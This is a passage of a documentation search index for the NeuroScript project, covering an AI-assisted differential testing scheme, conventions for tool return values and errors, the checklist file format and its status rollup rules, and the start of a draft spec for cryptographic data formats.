&amp; feature-rich Contract/Test harness (T) Pre-generated contracts \u2192 compile-time &amp; runtime assertions Catch obvious mis-behaviour Independent Oracle (O) \u2b1c (we\u2019ll fill this in) Decide who\u2019s wrong when I \u2260 T"},{"location":"three_plate_testing/#2-what-the-ai-driven-oracle-must-do","title":"2\u2003What the AI-driven oracle must do","text":"<ol> <li>Read the same contracts/specs that generated your tests.</li> <li>Think differently from the production algorithm (avoid share-the-same-bug).</li> <li>Emit opinions automatically \u2013 no human in the loop except when plates disagree.</li> <li>Stay cheap enough to run on every PR, but deep enough to reveal subtle warps.</li> </ol>"},{"location":"three_plate_testing/#3-build-the-oracle-as-a-pipeline-of-ai-agents","title":"3\u2003Build the oracle as a pipeline of AI agents","text":"Stage \u201cJob description\u201d Suitable AI technique Why it\u2019s independent Spec-to-Property converter Turn English-ish contract text into machine-checkable invariants GPT-4o / Claude-3 with chain-of-thought prompts Model never sees production source; only the spec Reference code synthesiser Generate a simple, obviously correct version (O<sub>impl</sub>) in Go or Python LLM guided by clarity &gt; speed rubric Uses different algorithmic path; think \u201cbubble sort vs quicksort\u201d Fuzz &amp; metamorphic generator Invent loads of inputs + transforms that shouldn\u2019t change output Property-based engines (e.g. Gopter) steered by LLM to hit edge cases Input space chosen without peeking at I\u2019s internals Critic agent When I, T, O disagree, write a natural-language diff explaining who is wrong and why Critic-style LLM (OpenAI CriticGPT-like models) Trained to dissect code/tests, not to generate production logic (wired.com) <p>CI flow</p> <ol> <li>Generate/refresh O<sub>impl</sub> &amp; invariants.</li> <li>Run I \u2194 O on fuzz corpus.</li> <li>Run T \u2194 O to validate test expectations.</li> <li>If any pair fails, Critic agent files an FDM ticket tagged <code>warped_plate</code>.</li> <li>Developer (or repair-bot) fixes the guilty artefact.</li> </ol>"},{"location":"three_plate_testing/#4-key-tricks-that-make-it-actually-work","title":"4\u2003Key tricks that make it actually work","text":"Problem Counter-measure Shared hallucination \u2013 LLM writes buggy oracle mirroring I Use ensemble diversity: ask two very different models (e.g. GPT-4o vs Gemma-2B local) to craft O<sub>impl</sub>; require consensus before accepting it. Cost explosion Run the full fuzz only on nightly build; PRs get a 1-second \u201csmoke lap\u201d. Oracle drift when spec evolves Contracts stored as versioned NeuroData nodes. A change automatically re-generates O<sub>impl</sub> and invalidates stale fuzz seeds. Opaque critiques Force Critic agent to cite contract clauses/invariant IDs; easy human follow-up. Security (don\u2019t run arbitrary LLM output) Sandbox O<sub>impl</sub> in Wasm or <code>--race -t 30s</code> Docker caps, same as any unk-trusted plugin."},{"location":"three_plate_testing/#5-minimal-starter-kit-in-go-pseudo-outline","title":"5\u2003Minimal starter kit in Go (pseudo-outline)","text":"<pre><code>// contracts.nd \u2192 invariants.go (generated)\ntype Invariant func(input Any, output Any) error\n\n// oracle_ref.go (LLM-written, checked-in)\nfunc SlowButSure(input Any) Any { \u2026 }\n\n// harness.go\nfunc Lap(input Any) (err error) {\n    prod := FastAlgo(input)\n    ref  := SlowButSure(input)\n    if !reflect.DeepEqual(prod, ref) { return fmt.Errorf(\"I\u2260O\") }\n    for _, inv := range invariants { if e := inv(input, ref); e != nil { return fmt.Errorf(\"O violates spec: %v\", e) } }\n    return nil\n}\n</code></pre> <p>Wire that into <code>go test ./...</code> plus a nightly <code>go test -fuzz 50x</code>.</p>"},{"location":"three_plate_testing/#6-where-ai-adds-the-most-value-first","title":"6\u2003Where AI adds the most value first","text":"<ol> <li>Numeric kernels (e.g., FDM similarity scorers) \u2013 easy to specify mathematically, painful to hand-test exhaustively.</li> <li>Parsing / serialization layers \u2013 metamorphic relations like encode \u2218 decode = identity.</li> <li>Security-sensitive transforms (ACL squeezers, capability derivation) \u2013 formal-ish invariants + slow recomputation catch privilege-escalation edge cases.</li> </ol>"},{"location":"three_plate_testing/#7-rough-roadmap","title":"7\u2003Rough roadmap","text":"Sprint Deliverable 0 Manual \u201cSlowButSure\u201d for one hot module; run diff-fuzz in CI. 1 LLM prompts that regenerate the slow impl + invariants from contract markup. 2 Critic agent integrated; outputs stored in FDM graph, routed to Interesting Times Gang for vote. 3 Ensemble model swap; nightly 100 k-case fuzz; auto-PR to patch warped tests/code. <p>Once that\u2019s humming, your code, tests and AI oracle will keep grinding each other flatter\u201424/7, no extra human sandpaper required.</p> <p>Bottom line: use synthetic but independent minds (LLMs + fuzz engines) to play the role of the third plate.  They derive their authority from the contracts, not from your production code, and their constant pair-wise fights surface whoever slipped.  The latest \u201ccritic\u201d models show this is practical today (arstechnica.com, arxiv.org).</p>"},{"location":"tool_conventions/","title":"Tool conventions","text":"<p># NeuroScript Tool Return and Error Conventions</p> <p>Version: 1.0.0  Date: May 21, 2025</p> <p>### 1. Introduction</p> <p>This document outlines the established conventions for how tools in NeuroScript report success, return data, and signal errors. Understanding these conventions is crucial for writing robust NeuroScript procedures and for AI systems that generate or execute NeuroScript code.</p> <p>The primary error handling mechanism relies on standard Go error returns at the tool's implementation level, which are then processed by the NeuroScript interpreter.</p> <p>### 2. Core Go <code>ToolFunc</code> Signature</p> <p>All Go functions that implement NeuroScript tools adhere to the following signature, as defined in <code>pkg/core/tools_types.go</code>:</p> <pre><code>type ToolFunc func(interpreter *Interpreter, args []interface{}) (interface{}, error)\n</code></pre> <ul> <li><code>interface{}</code> (ToolResult): This is the primary data or status returned to the NeuroScript environment if the tool's Go function executes without an exceptional error.</li> <li><code>error</code> (Go Error): This is a standard Go error.<ul> <li>A non-<code>nil</code> <code>error</code> signals an exceptional failure during the tool's execution at the Go level.</li> <li>A <code>nil</code> <code>error</code> indicates that the tool's Go function completed its intended operation without encountering an exceptional Go-level error. The <code>interface{}</code> result is then considered valid.</li> </ul> </li> </ul> <p>### 3. NeuroScript Interpreter Handling</p> <p>The NeuroScript interpreter processes the <code>(interface{}, error)</code> pair returned by a tool's Go function:</p> <ul> <li>If the Go <code>error</code> is non-<code>nil</code>:<ul> <li>The interpreter catches this error and typically converts it into a <code>core.RuntimeError</code>.</li> <li>This <code>RuntimeError</code> triggers the script's error handling mechanisms:<ul> <li>It may cause an immediate halt of the script.</li> <li>It can be caught by an <code>on_error ... endon</code> block within the current NeuroScript procedure.</li> </ul> </li> <li>When such a Go-level error occurs, the <code>interface{}</code> (ToolResult) from the Go function is generally disregarded. From the NeuroScript's perspective, a variable assigned the tool's result (e.g., via <code>set my_var = tool.Example()</code>) will likely receive <code>nil</code>, or the <code>last</code> keyword will reflect <code>nil</code> or a previous valid result. The script should not expect a descriptive error string as the direct return value of the tool in this case; the error is handled by the interpreter's state.</li> </ul> </li> <li>If the Go <code>error</code> is <code>nil</code>:<ul> <li>The interpreter considers the tool's Go-level execution successful.</li> <li>The <code>interface{}</code> (ToolResult) is passed to the NeuroScript environment. This is the value assigned to variables or accessible via <code>last</code>.</li> </ul> </li> </ul> <p>### 4. Observed Patterns &amp; NeuroScript-Level Handling</p> <p>Based on an analysis of tool implementations (e.g., in <code>pkg/core/tools_fs_read.go</code>, <code>pkg/core/tools_fs_write.go</code>, <code>pkg/core/tools_git.go</code>, <code>pkg/core/ai_wm_tools_execution.go</code>) and their definitions (e.g., <code>pkg/core/tooldefs_fs.go</code>):</p> <ul> <li>Tools Returning Data:<ul> <li>Example: <code>FS.Read</code>.</li> <li>Convention: On success (Go <code>error</code> is <code>nil</code>), they return the actual data (e.g., file content as a string) as the <code>interface{}</code>.</li> <li>NeuroScript Handling:      <pre><code>set file_content = tool.FS.Read(\"my_file.txt\")\nif file_content == nil\n  emit \"Error: Failed to read file or file is empty.\"\n  # Potentially fail or handle error\nelse\n  # Process file_content\nendif\n# OR, more robustly if an error halts or goes to on_error:\n# on_error means\n#   emit \"FS.Read failed: \" + system.error_message\n# endon\n# set file_content = tool.FS.Read(\"my_file.txt\")\n# must file_content != nil # If nil implies an error that didn't halt.\n</code></pre></li> </ul> </li> <li>Tools Primarily for Side-Effects Returning Success Messages:<ul> <li>Examples: <code>FS.Write</code>, <code>Git.Add</code>, <code>Git.Commit</code>.</li> <li>Convention: On success (Go <code>error</code> is <code>nil</code>), these tools return a descriptive string message (e.g., \"Successfully wrote X bytes...\") as the <code>interface{}</code>. Their <code>ToolSpec.ReturnType</code> is typically <code>ArgTypeString</code>.</li> <li>NeuroScript Handling:      <pre><code>set write_result = tool.FS.Write(\"output.txt\", \"hello\")\n# If an actual Go error occurred, an on_error block would likely trigger,\n# or the script would halt. 'write_result' might be nil then.\n# If no error state, 'write_result' holds the success message.\nemit \"FS.Write operation status: \" + write_result\n</code></pre>      Checking for a specific string like \"OK\" is fragile unless the tool's <code>ToolSpec</code> description guarantees that exact string. It's safer to assume any non-<code>nil</code> string result (in the absence of a script error/halt) indicates success for these tools.</li> </ul> </li> <li>Tools Returning Structured Status/Data Maps:<ul> <li>Example: <code>AIWorker.ExecuteStatelessTask</code> (the Go tool function wrapper).</li> <li>Convention: On success (Go <code>error</code> is <code>nil</code>), returns a map containing various pieces of information (e.g., <code>{\"output\": ..., \"taskId\": ..., \"cost\": ...}</code>). The <code>ToolSpec.ReturnType</code> is <code>ArgTypeMap</code>.</li> <li>NeuroScript Handling:      <pre><code>set ai_map_result = tool.AIWorker.ExecuteStatelessTask(...)\nif ai_map_result == nil\n  emit \"Error: AIWorker.ExecuteStatelessTask tool call failed at interpreter level.\"\nelse\n  # Process ai_map_result, e.g., ai_map_result[\"output\"]\n  # Note: This specific tool's Go wrapper doesn't add an \"error\" key to this map.\n  # Errors from the underlying AI service call result in the Go wrapper itself\n  # returning a non-nil Go error, which the interpreter handles.\nendif\n</code></pre></li> </ul> </li> <li>Tools with Side-Effects and No Specific Return Value (Hypothetical/Future):<ul> <li>Convention: If a tool has only side-effects and no meaningful data/message to return on success, its <code>ToolSpec.ReturnType</code> would ideally be <code>ArgTypeNil</code>. The Go <code>ToolFunc</code> would return <code>(nil, nil)</code>.</li> <li>NeuroScript Handling:      <pre><code>call tool.SilentSideEffectTool()\n# Success is implied if execution continues and no on_error block is triggered.\n# There's no meaningful direct return value to check.\n</code></pre></li> </ul> </li> </ul> <p>### 5. Recommendations for NeuroScript Authors (Human &amp; AI)</p> <ol> <li>Primary Error Detection: Rely on NeuroScript's <code>on_error ... endon</code> blocks to catch and handle exceptional failures originating from tools (which are propagated as <code>RuntimeError</code>s by the interpreter). If an error is critical and unrecoverable by the script, allow the script to halt.</li> <li>Checking Tool Results:<ul> <li>Data-Returning Tools: After a <code>set var = tool.GetData()</code>, check if <code>var</code> is <code>nil</code>. A <code>nil</code> value often means the underlying Go tool function returned an error, which the interpreter handled, resulting in <code>nil</code> being passed to the script. Then, validate the data if non-<code>nil</code>.</li> <li>Message-Returning Tools: For tools like <code>FS.Write</code> or <code>Git.Commit</code> that return a success message string, you can <code>emit</code> this string for logging. Its presence (non-<code>nil</code> string) after a call, without an <code>on_error</code> trigger, implies success. Avoid checking for an exact string like \"OK\" unless the <code>ToolSpec.Description</code> for that specific tool explicitly guarantees it.</li> <li>Map-Returning Tools: If a tool returns a map, check for <code>nil</code> first (indicating a Go-level error during the tool call). If non-<code>nil</code>, inspect the documented keys within the map for specific results or operational status.</li> <li><code>must</code> Statements: Use <code>must</code> statements to assert expected conditions after a tool call if its direct return value isn't a simple status (e.g., <code>must file_exists_now == true</code> after a <code>tool.FS.Write</code> if another tool <code>tool.FS.FileExists</code> were available).</li> </ul> </li> <li>Consult Tool Specifications: When available, <code>ToolSpec.Description</code> and <code>ToolSpec.ReturnType</code> (often found in <code>tooldefs_*.go</code> files) provide the most reliable information on what a tool is expected to return in NeuroScript on successful execution.</li> </ol> <p>### 6. Future Consistency</p> <p>As discussed, future work may involve making the return patterns of side-effect tools more consistent (e.g., all returning <code>nil</code> via <code>ArgTypeNil</code> for success, or all returning a standardized status map). The guidelines above reflect the current observed conventions.</p>"},{"location":"NeuroData/checklist/","title":"Checklist","text":"<p>:: version: 0.6.0  :: updated: 2025-05-02  :: dependsOn: pkg/neurodata/checklist/scanner_parser.go, pkg/neurodata/checklist/defined_errors.go, docs/conventions.md  :: howToUpdate: Review scanner_parser.go and defined_errors.go, ensure syntax, error handling (ErrMalformedItem, ErrNoContent), parsing logic (string manip, not regex), status conventions, rollup logic, and examples are accurate.</p> <p># NeuroData Checklist Format (.ndcl) Specification</p> <p>## 1. Purpose</p> <p>NeuroData Checklists provide a simple, human-readable format for tracking tasks, requirements, or states. They are designed to be easily parsed and manipulated by tools while remaining clear in plain text. They use a syntax based on Markdown task lists, with an extension for items whose status is automatically derived from children.</p> <p>## 2. Syntax</p> <p>A checklist file or block primarily consists of checklist item lines, optionally preceded by file-level metadata. Comments and blank lines are also permitted. The parser uses string manipulation (not regular expressions) to identify items.</p> <p>### 2.1 Checklist Item Line</p> <p>Each checklist item starts with an optional indentation, followed by a hyphen (<code>-</code>), one or more spaces, and then either square brackets <code>[]</code> for manual items or pipe symbols <code>||</code> for automatic items, enclosing a status symbol.</p> <p>Manual Item: <pre><code>Optional Indentation + \"- \" + \"[\" + Status Symbol + \"]\" + Optional Whitespace + Description Text\n</code></pre></p> <p>Automatic Item: <pre><code>Optional Indentation + \"- \" + \"|\" + Status Symbol + \"|\" + Optional Whitespace + Description Text\n</code></pre></p> <ul> <li>Indentation: Optional leading whitespace (spaces or tabs) before the <code>-</code> defines the item's nesting level (calculated as number of runes). Significant for automatic status rollup (see Section 4.2).</li> <li>Marker: Must start with a hyphen (<code>-</code>) followed by at least one space (<code>-</code>).</li> <li>Delimiter:<ul> <li><code>[</code>...<code>]</code> (Square Brackets): Indicate a manual item whose status is set directly.</li> <li><code>|</code>...<code>|</code> (Pipe Symbols): Indicate an automatic item whose status should be calculated by tools based on its children (see Section 4.2). The parser identifies the closing pipe relative to the opening one.</li> </ul> </li> <li>Status Symbol (Inside Delimiters): A single character representing the current state. The parser handles normalization (e.g., <code>X</code> to <code>x</code>). See Section 2.2 for standard symbols.</li> <li>Description Text: Any text following the closing delimiter (<code>]</code> or <code>|</code>). Leading/trailing whitespace around the description is trimmed by the parser.</li> </ul> <p>### 2.2 Status Symbols</p> <p>The following table defines the standard status symbols recognized by the parser and the corresponding string representation used for the <code>status</code> attribute in the <code>GenericTree</code> representation.</p> Symbol(s) in File Status String (<code>GenericTree</code>) Meaning Type <code></code> (space), empty <code>\"open\"</code> Task is not started or is pending. Manual <code>x</code>, <code>X</code> <code>\"done\"</code> Task is completed. Manual <code>-</code> <code>\"skipped\"</code> Task is skipped or intentionally not done. Manual <code>&gt;</code> <code>\"inprogress\"</code> Task is currently being worked on. Manual <code>!</code> <code>\"blocked\"</code> Task cannot proceed due to external factors. Manual <code>?</code> <code>\"question\"</code> Task requires clarification or information. Manual any other single <code>\"special\"</code> Any other non-standard single char status. Manual <code></code> (space), empty <code>\"open\"</code> Default state, or all children are open. Automatic <code>x</code> <code>\"done\"</code> All direct children are done. Automatic <code>-</code> <code>\"partial\"</code> At least one child is done or partial/skipped. Automatic <code>&gt;</code> <code>\"inprogress\"</code> Rollup state if relevant child is in progress. Automatic <code>!</code> <code>\"blocked\"</code> Rollup state if relevant child is blocked. Automatic <code>?</code> <code>\"question\"</code> Rollup state if relevant child is a question. Automatic any other single <code>\"special\"</code> Rollup state from a non-standard child status. Automatic <p>Notes:  * The parser normalizes <code>X</code> to <code>x</code>.  * The \"Status String\" is the value expected in the <code>\"status\"</code> attribute of a <code>checklist_item</code> node in the <code>GenericTree</code> representation.  * For automatic items (<code>| |</code>), the symbol inside the pipes represents the calculated status based on children (see Rollup Logic, Section 4.2), but the <code>GenericTree</code> status string reflects the meaning (e.g., <code>|-|</code> results in <code>\"partial\"</code> status). If a \"Special\" symbol rolls up, the <code>GenericTree</code> status string should match the rolled-up symbol's category (e.g., <code>|?|</code> gives <code>\"question\"</code>).  * If the content inside <code>[]</code> or <code>||</code> is malformed (e.g., more than one character like <code>[xx]</code>), the parser returns <code>ErrMalformedItem</code>.</p> <p>### 2.3 Other Allowed Lines  * File-Level Metadata: <code>:: key: value</code> at the very beginning. Parsed using the <code>metadata</code> package.  * Markdown Headings: Lines starting with <code>#</code>. Skipped by the checklist parser.  * Comments: Lines starting with <code>#</code> or <code>--</code> (after optional whitespace). Skipped.  * Blank Lines: Skipped.</p> <p>### 2.4 End of Checklist  The checklist parsing stops at the first line encountered that is not a valid checklist item (manual or automatic), a heading, a comment, a blank line, or a valid file-level metadata line (if before any items).</p> <p>## 3. Metadata  ### 3.1 File-Level Metadata  Standard <code>:: key: value</code> lines at the very beginning of the content, parsed by the <code>metadata.Extract</code> function.</p> <p>### 3.2 Block-Level Metadata (in Composite Files)  Standard <code>:: key: value</code> lines immediately preceding a fenced code block (e.g., ```neurodata-checklist). Handled by block extraction tools.</p> <p>## 4. Status Interpretation and Rollup  (Section remains the same as previous version, describes the intended semantics.)  ### 4.1 Item Status Categories  * Open: Symbol <code></code> (space). Written as <code>[ ]</code> (manual) or <code>| |</code> (automatic, calculated). Corresponds to <code>\"open\"</code> status string.  * Done: Symbol <code>x</code> (normalized from <code>x</code> or <code>X</code>). Written as <code>[x]</code> (manual) or <code>|x|</code> (automatic, calculated). Corresponds to <code>\"done\"</code> status string.  * Skipped: Symbol <code>-</code>. Written as <code>[-]</code> (manual). Corresponds to <code>\"skipped\"</code> status string.  * Partial: Symbol <code>-</code>. Written as <code>|-|</code> (automatic, calculated). Corresponds to <code>\"partial\"</code> status string. Note: The same symbol <code>-</code> has different meanings based on context.  * InProgress: Symbol <code>&gt;</code>. Written as <code>[&gt;]</code> (manual) or <code>|&gt;|</code> (automatic, calculated). Corresponds to <code>\"inprogress\"</code> status string.  * Blocked: Symbol <code>!</code>. Written as <code>[! ]</code> (manual) or <code>|!|</code> (automatic, calculated). Corresponds to <code>\"blocked\"</code> status string.  * Question: Symbol <code>?</code>. Written as <code>[?]</code> (manual) or <code>|?|</code> (automatic, calculated). Corresponds to <code>\"question\"</code> status string.  * Special: Symbol is any other single character. Corresponds to <code>\"special\"</code> status string.  * Automatic: Indicated by the use of <code>| |</code> delimiters instead of <code>[ ]</code>. The symbol inside <code>||</code> represents the calculated status based on children. The parser sets an <code>IsAutomatic</code> flag.</p> <p>### 4.2 Status Rollup Logic (for Automatic <code>| |</code> Items)  When a tool updates or reformats a checklist containing automatic items (parsed with <code>||</code>), it should determine the status symbol for that item by examining its direct children. The rules are applied in order of priority:</p> <ol> <li>Special Wins: If any direct child has a status corresponding to <code>!</code>, <code>?</code>, <code>&gt;</code>, or <code>\"special\"</code>, the automatic parent item takes on the status symbol of the first such special child encountered (e.g., <code>!</code>, <code>?</code>, <code>&gt;</code>).</li> <li>Partial if Any Partial/Done/Skipped: Else if any direct child has status corresponding to <code>\"skipped\"</code>, <code>\"partial\"</code>, OR <code>\"done\"</code>, the automatic parent item's status symbol becomes <code>-</code> (Partial).</li> <li>Done if All Done: Else if all direct children are <code>\"done\"</code>, the automatic parent item's status symbol becomes <code>x</code> (Done).</li> <li>Open if All Open: Else (must mean all direct children are <code>\"open\"</code>), the automatic parent item's status symbol remains <code></code> (Open).</li> <li>No Children: If an automatic item has no direct children, its status symbol is <code></code> (Open).</li> </ol> <p>## 5. Parser Output &amp; Errors</p> <p>The <code>ParseChecklist</code> function returns a <code>ParsedChecklist</code> struct containing <code>Metadata map[string]string</code> and <code>Items []ChecklistItem</code>, or an error.</p> <p>### 5.1 ChecklistItem Struct  * <code>Text</code>: string (Trimmed description)  * <code>Status</code>: string (Standardized: <code>\"open\"</code>, <code>\"done\"</code>, <code>\"skipped\"</code>, <code>\"partial\"</code>, <code>\"inprogress\"</code>, <code>\"blocked\"</code>, <code>\"question\"</code>, <code>\"special\"</code>)  * <code>Symbol</code>: rune (The original single char symbol found: ' ', 'x', '-', '&gt;', '!', '?', etc.)  * <code>Indent</code>: int (Number of leading runes before '-')  * <code>LineNumber</code>: int (1-based line number in the original input)  * <code>IsAutomatic</code>: bool (True if <code>| |</code> was used, false if <code>[ ]</code> was used)</p> <p>### 5.2 Defined Errors  * <code>ErrMalformedItem</code>: Returned if delimiter content is invalid (e.g., <code>[xx]</code>).  * <code>ErrNoContent</code>: Returned if the input contains no valid metadata or checklist items after skipping comments/blanks/headings.  * <code>ErrScannerFailed</code>: Returned if an underlying error occurs during line scanning (wraps the original scanner error).</p> <p>## 6. Canonical Formatting  Tools that reformat checklists should aim for this output:</p> <ul> <li>Manual Open items: <code>- [ ] Description</code></li> <li>Manual Done items: <code>- [x] Description</code></li> <li>Manual Skipped items: <code>- [-] Description</code></li> <li>Manual InProgress items: <code>- [&gt;] Description</code></li> <li>Manual Blocked items: <code>- [!] Description</code></li> <li>Manual Question items: <code>- [?] Description</code></li> <li>Manual Special items: <code>- [*] Description</code> (using the specific symbol)</li> <li>Automatic items: Written using <code>| |</code> delimiters with the calculated status symbol inside (e.g., <code>- |-| Description</code> if calculated as partial, <code>- |!| Description</code> if calculated as blocked, <code>- | | Description</code> if open).</li> <li>Indentation: Preserved or normalized (typically 2 spaces per level is recommended).</li> </ul> <p>## 7. Examples</p> <p>### Example 1: Manual Statuses  (Uses <code>[]</code>)  <pre><code>- [ ] Open task\n- [x] Completed task\n- [-] Skipped task\n- [&gt;] In-progress task\n- [!] Blocked task\n- [?] Question task\n- [*] Special status task\n</code></pre></p> <p>### Example 2: Automatic Rollup (Using <code>| |</code> Marker)</p> <pre><code># Input with Automatic Markers (using | | initially)\n- | | Overall Project\n  - [x] Phase 1 Done\n  - [-] Phase 2 Skipped (Manual)\n  - [ ] Phase 3 Open\n- | | Feature A\n  - [?] Sub-task A1 (Needs Info - Question)\n  - [ ] Sub-task A2\n- | | Feature B\n  - [x] Sub-task B1\n  - [x] Sub-task B2\n- | | Feature C (No Children)\n- | | Feature D\n  - [ ] Step D1\n  - [ ] Step D2\n\n# Output After Tool Reformats/Updates\n- |-| Overall Project # Partial: Contains Skipped/Done children\n  - [x] Phase 1 Done\n  - [-] Phase 2 Skipped (Manual)\n  - [ ] Phase 3 Open\n- |?| Feature A # Question: First child is '?'\n  - [?] Sub-task A1 (Needs Info - Question)\n  - [ ] Sub-task A2\n- |x| Feature B # Done: All children done\n  - [x] Sub-task B1\n  - [x] Sub-task B2\n- | | Feature C (No Children) # Open: No children\n- | | Feature D # Open: All children open\n  - [ ] Step D1\n  - [ ] Step D2\n</code></pre> <p>### Example 3: File With Metadata and Special Rollup (Using <code>| |</code> Marker)</p> <p><pre><code>:: version: 0.2.0\n:: type: Checklist\n:: component: Backend\n\n# API Endpoints\n- | | User Management # Marked as automatic\n  - [x] GET /users\n  - [x] POST /users\n  - [-] GET /users/{id} (Skipped status)\n  - [\ud83d\udd25] PUT /users/{id} (Special status: on fire!)\n  - [ ] DELETE /users/{id}\n- [ ] Order Processing # Manual item\n</code></pre> After reformatting, the <code>User Management</code> line would become <code>|\ud83d\udd25| User Management</code> because the first \"Special\" status (<code>\ud83d\udd25</code>) encountered among its direct children takes precedence.</p>"},{"location":"NeuroData/cryptographic/","title":"NeuroData Cryptographic Formats Specification","text":"<p>:: type: Specification :: version: 0.1.0 :: status: draft :: dependsOn: docs/metadata.md, docs/references.md, docs/neurodata_and_composite_file_spec.md :: howToUpdate: Refine attributes for each type, specify encoding formats (PEM, Base64, Hex), detail tool requirements and expected behaviors.</p>"},{"location":"NeuroData/cryptographic/#1-purpose","title":"1. Purpose","text":"<p>This document defines a set of NeuroData formats for representing common cryptographic objects: identities/key pairs (<code>.ndid</code>), digital certificates (<code>.ndcert</code>), digital signatures (<code>.ndsig</code>), and cryptographic hashes (<code>.ndhash</code>). These formats aim to store cryptographic information and metadata in a human-readable structure suitable for use within the NeuroScript ecosystem, primarily facilitating verification, identification, and integrity checks performed by dedicated tools.</p>"},{"location":"NeuroData/cryptographic/#2-security-considerations","title":"2. Security Considerations","text":"<ul> <li>Private Keys: These formats are NOT intended for storing sensitive private key material directly in plain text. Private keys should be managed through secure external mechanisms (e.g., hardware security modules, encrypted storage, environment variables). References (like <code>PRIVATE_KEY_REF</code>) may point to identifiers for such keys, but the key data itself should generally not be present. Storing public keys, certificates, signatures, and hashes is the primary goal.</li> <li>Tooling: The usefulness of these formats is entirely dependent on the existence and correct implementation of secure cryptographic tools within the NeuroScript environment (see Section 5).</li> </ul>"},{"location":"NeuroData/cryptographic/#3-common-elements","title":"3. Common Elements","text":"<p>All cryptographic formats below generally follow these conventions: * Structure: Tagged Line Structure (similar to <code>.ndform</code>), where each object starts with metadata, followed by attribute lines defining its properties. * Metadata: Each format uses standard <code>:: key: value</code> metadata, including <code>:: type: &lt;TypeName&gt;</code>, <code>:: version:</code>, and potentially <code>:: id:</code>. * Data Encoding: Large opaque data like public keys, certificates, or signatures are typically stored within fenced blocks (e.g., <code>pem ...</code>, <code>base64 ...</code>, <code>hex ...</code>) immediately following their corresponding attribute tag (e.g., <code>PUBLIC_KEY</code>, <code>CERTIFICATE</code>, <code>SIGNATURE</code>, <code>HASH_VALUE</code>). The language tag of the fence indicates the encoding. Simple hashes or fingerprints might be represented as quoted strings directly on the attribute line. * References: Uses the standard <code>[ref:&lt;location&gt;#&lt;block_id&gt;]</code> or <code>[ref:&lt;location&gt;]</code> syntax [cite: generated previously in <code>docs/references.md</code>] to link related objects (e.g., a signature referencing the content it signs, a certificate referencing its public key identity).</p>"},{"location":"NeuroData/cryptographic/#4-format-specifications","title":"4. Format Specifications","text":""},{"location":"NeuroData/cryptographic/#41-identity-key-pair-ndid","title":"4.1 Identity / Key Pair (<code>.ndid</code>)","text":"<ul> <li>Purpose: Represents a cryptographic identity, primarily its public key.</li> <li><code>:: type: Identity</code></li> <li>Attributes:<ul> <li><code>LABEL \"&lt;name&gt;\"</code>: Human-readable name.</li> <li><code>TYPE \"&lt;algorithm&gt;\"</code>: E.g., \"RSA\", \"Ed25519\", \"ECDSA\".</li> <li><code>SIZE &lt;bits&gt;</code>: Key size (e.g., 2048, 256).</li> <li><code>PUBLIC_KEY</code> (Followed by <code>```pem ... ```</code> block containing the public key).</li> <li><code>PRIVATE_KEY_REF \"&lt;identifier_or_uri&gt;\"</code>: (Optional, points to secure storage, NOT the key itself).</li> <li><code>CREATED_AT &lt;timestamp&gt;</code>: (Optional).</li> <li><code>DESCRIPTION \"&lt;text&gt;\"</code>: (Optional).</li> </ul> </li> <li>Example: <pre><code>:: type: Identity\n:: version: 0.1.0\n:: id: service-key-001\n\nLABEL \"Main Service Signing Key\"\nTYPE \"Ed25519\"\nPUBLIC_KEY ```pem\n-----BEGIN PUBLIC KEY-----\nMCowBQYDK2VwAyEA[...]EXAMPLE[...]oW1lA=\n-----END PUBLIC KEY-----\n</code></pre>     CREATED_AT 2024-03-01T12:00:00Z     ```</li> </ul>"},{"location":"NeuroData/cryptographic/#42-certificate-ndcert","title":"4.2 Certificate (<code>.ndcert</code>)","text":"<ul> <li>Purpose: Represents a digital certificate (typically X.509).</li> <li><code>:: type: Certificate</code></li> <li>Attributes:<ul> <li><code>SUBJECT \"&lt;distinguished_name&gt;\"</code></li> <li><code>ISSUER \"&lt;distinguished_name&gt;\"</code></li> <li><code>SERIAL_NUMBER \"&lt;hex_or_decimal_string&gt;\"</code></li> <li><code>VERSION &lt;number&gt;</code> (e.g., 3 for X.509v3)</li> <li><code>VALID_FROM &lt;timestamp&gt;</code></li> <li><code>VALID_UNTIL &lt;timestamp&gt;</code></li> <li><code>SIGNATURE_ALGORITHM \"&lt;name_or_oid&gt;\"</code></li> <li><code>PUBLIC_KEY_INFO</code> (Optional, followed by <code>```text ... ```</code> block with details like type/size, or use <code>PUBLIC_KEY_REF</code>)</li> <li><code>PUBLIC_KEY_REF \"[ref:...]\"</code> (Optional link to an <code>.ndid</code> object).</li> <li><code>FINGERPRINT_SHA256 \"&lt;hex_string&gt;\"</code> (Optional, common identifier).</li> <li><code>CERTIFICATE</code> (Followed by <code>```pem ... ```</code> block containing the certificate).</li> </ul> </li> <li>Example: <pre><code>:: type: Certificate\n:: version: 0.1.0\n:: id: web-server-cert-2025\n\nSUBJECT \"CN=[www.example.com](https://www.example.com), O=Example Corp, C=US\"\nISSUER \"CN=Example Intermediate CA G1, O=Example Corp, C=US\"\nSERIAL_NUMBER \"1A:2B:3C:4D:...\"\nVERSION 3\nVALID_FROM 2024-01-01T00:00:00Z\nVALID_UNTIL 2025-01-01T23:59:59Z\nSIGNATURE_ALGORITHM \"SHA256withRSA\"\nFINGERPRINT_SHA256 \"a1b2c3d4e5f6...\"\nPUBLIC_KEY_REF \"[ref:keys/webserver.ndid#key-01]\"\nCERTIFICATE ```pem\n-----BEGIN CERTIFICATE-----\nMIIDqDCCApCgAwIBAgIJA[...]EXAMPLE[...]K4A/DQ==\n-----END CERTIFICATE-----\n</code></pre>     ```</li> </ul>"},{"location":"NeuroData/cryptographic/#43-signature-ndsig","title":"4.3 Signature (<code>.ndsig</code>)","text":"<ul> <li>Purpose: Represents a digital signature over specified content.</li> <li><code>:: type: Signature</code></li> <li>Attributes:<ul> <li><code>CONTENT_REF \"[ref:&lt;location&gt;[#&lt;block_id&gt;]]\"</code>: Reference to the signed content (file or block).</li> <li><code>SIGNER_REF \"[ref:&lt;location&gt;#&lt;key_id&gt;]\"</code>: Reference to the signer's <code>.ndid</code> public key.</li> <li><code>ALGORITHM \"&lt;sig_alg_name&gt;\"</code>: E.g., \"SHA256withRSA\", \"EdDSA\", \"ECDSAwithSHA256\".</li> <li><code>TIMESTAMP &lt;iso8601_timestamp&gt;</code>: (Optional) Time of signing.</li> <li><code>SIGNATURE</code> (Followed by <code>```base64 ... ```</code> or <code>```hex ... ```</code> block containing the signature value).</li> </ul> </li> <li>Example: <pre><code>:: type: Signature\n:: version: 0.1.0\n:: id: manifest-sig-v2\n\nCONTENT_REF \"[ref:manifest.json]\"\nSIGNER_REF \"[ref:identities/release_key.ndid#prod-signer]\"\nALGORITHM 